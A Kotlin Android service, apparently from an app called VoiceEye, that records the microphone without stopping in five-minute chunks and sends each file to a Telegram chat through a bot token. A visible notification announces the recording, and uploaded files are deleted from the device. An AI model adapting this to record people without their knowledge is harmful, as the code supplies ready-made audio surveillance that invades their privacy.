package com.example.voiceeye

import android.app.Notification
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.util.concurrent.Executors

class RecordingService : Service() {
    companion object {
        private const val TAG = "RecordingService"
        private const val CHANNEL_ID = NotificationHelper.CHANNEL_ID
        private const val RECORD_DURATION_MS = 5 * 60 * 1000L // 5 minutes
    }

    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    private val executor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())

    private var botToken: String? = null
    private var chatId: String? = null
    private var uploadWifiOnly = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        botToken = intent?.getStringExtra("TELEGRAM_BOT_TOKEN")
        chatId = intent?.getStringExtra("TELEGRAM_CHAT_ID")
        uploadWifiOnly = intent?.getBooleanExtra("UPLOAD_WIFI_ONLY", false) ?: false

        NotificationHelper.createChannel(applicationContext)
        startForeground(1, createNotification("Starting recording..."))
        startNewRecording()
        return START_STICKY
    }

    private fun createNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("VoiceEye — Recording")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setOngoing(true)
            .build()
    }

    private fun startNewRecording() {
        try {
            val dir = getExternalFilesDir("records") ?: filesDir
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, "rec_${System.currentTimeMillis()}.mp4")
            currentFile = file

            recorder?.release()
            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(16000)
                setAudioEncodingBitRate(64_000)
                setOutputFile(file.absolutePath)

                setMaxDuration(RECORD_DURATION_MS.toInt())

                setOnInfoListener { mr, what, extra ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        Log.i(TAG, "Max duration reached for ${file.name}")
                        executor.execute {
                            safeStopRecorderAndUpload(file)
                            SystemClock.sleep(200)
                            handler.post { startNewRecording() }
                        }
                    }
                }

                prepare()
                start()
            }
            Log.i(TAG, "Started recording -> ${file.absolutePath}")
            startForeground(1, createNotification("Recording: ${file.name}"))
        } catch (e: Exception) {
            Log.e(TAG, "startNewRecording error", e)
            stopSelf()
        }
    }

    private fun safeStopRecorderAndUpload(file: File) {
        try {
            recorder?.run {
                try { stop() } catch (ex: RuntimeException) { Log.w(TAG, "stop threw", ex) }
                release()
            }
        } catch (ex: Exception) {
            Log.w(TAG, "Error stopping recorder", ex)
        } finally { recorder = null }

        if (!file.exists()) {
            Log.w(TAG, "File not found for upload: ${file.absolutePath}")
            return
        }

        startForeground(1, createNotification("Uploading: ${file.name}"))

        if (uploadWifiOnly && !isOnWifi()) {
            Log.i(TAG, "Wi-Fi required, file queued: ${file.name}")
            startForeground(1, createNotification("Queued for Wi-Fi: ${file.name}"))
            return
        }

        val ok = TelegramUploader.uploadAudio(botToken ?: "", chatId ?: "", file)
        Log.i(TAG, "Upload finished for ${file.name} success=$ok")
        if (ok) try { file.delete() } catch (_: Throwable) {}
        startForeground(1, createNotification("Recording (next file...)"))
    }

    private fun isOnWifi(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val nw = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(nw) ?: return false
        return caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            recorder?.run {
                try { stop() } catch (_: Exception) {}
                release()
            }
        } catch (_: Exception) {}
        recorder = null
        executor.shutdownNow()
        Log.i(TAG, "Service destroyed")
    }

    override fun onBind(intent: Intent?) = null
}
